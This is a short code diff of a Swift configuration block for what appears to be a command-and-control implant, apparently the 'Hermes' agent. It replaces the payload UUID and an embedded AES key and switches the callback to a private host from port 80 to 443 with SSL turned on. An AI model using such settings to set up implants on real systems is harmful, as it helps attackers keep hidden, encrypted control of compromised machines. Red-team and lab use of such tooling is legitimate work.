@@ -30,16 +30,16 @@ struct AgentConfig {
 }
 
 var agentConfig = AgentConfig(
-    payloadUUID: "c401a513-e324-4713-86a6-86df364add5a",
-    encodedAESKey: "3UmFTYODq8iS9Y6EWC3WelRksF2RZI/hax1nPg/wq9o=",
+    payloadUUID: "01539837-f551-434d-b63f-303521a0ea53",
+    encodedAESKey: "C6DSlw55aHZKADtZIKAP67IHWyFfpyXssqrzv/JX8YU=",
 
     callbackHost: "192.168.196.3",
     getRequestURI: "/index",
     postRequestURI: "/data",
-    callbackPort: 80,
+    callbackPort: 443,
     userAgent: "Hermes user agent",
     hostHeader: "",
-    useSSL: false,
+    useSSL: true,
     queryParameter: "q",
     httpHeaders: ["key1":"value1","key2":"value2"],
 
